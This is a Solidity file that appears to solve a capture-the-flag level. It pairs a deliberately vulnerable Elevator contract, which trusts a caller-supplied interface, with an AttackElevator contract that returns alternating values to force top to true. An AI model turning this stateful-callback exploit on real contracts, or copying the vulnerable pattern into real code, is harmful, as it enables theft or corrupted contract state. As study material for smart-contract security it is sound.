// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator {

    Elevator toAttack;
    uint callCount = 0;

    constructor(address _levelInstance) public payable {
        toAttack = Elevator(_levelInstance);
    }

    function attack() public {
        toAttack.goTo(10);
    }

    //redefine isLastFloor to alternate boolean return values so if statement passes
    //in goTo() and then top is set to true
    function isLastFloor(uint floor) external returns (bool) {
        callCount++;
        return callCount % 2 == 0? true : false;
    }
}